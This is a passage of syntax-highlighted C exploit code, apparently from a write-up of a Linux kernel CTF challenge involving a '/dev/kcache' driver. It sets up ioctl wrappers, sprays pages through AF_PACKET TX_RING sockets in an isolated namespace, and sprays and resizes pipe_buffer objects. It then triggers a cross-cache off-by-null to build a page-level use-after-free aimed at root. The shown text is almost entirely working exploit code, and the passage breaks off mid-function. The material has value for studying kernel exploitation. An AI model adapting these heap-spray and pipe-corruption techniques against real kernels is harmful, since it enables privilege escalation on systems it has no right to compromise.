class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - interface to interact with /dev/kcache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_ALLOC 0x114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_APPEND 0x514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_READ 0x1919</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_FREE 0x810</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sz;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_alloc</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_append</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_read</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_free</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - config for page-level heap spray and heap fengshui</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line"><span class="type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for pipe escalation */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> orig_pid = <span class="number">-1</span>, victim_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_orig_pid = <span class="number">-1</span>, snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_2nd_pipe_pid = <span class="number">-1</span>, self_3rd_pipe_pid = <span class="number">-1</span>, self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">            orig_pid = nr;</span><br><span class="line">            victim_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">                   victim_pid, orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span 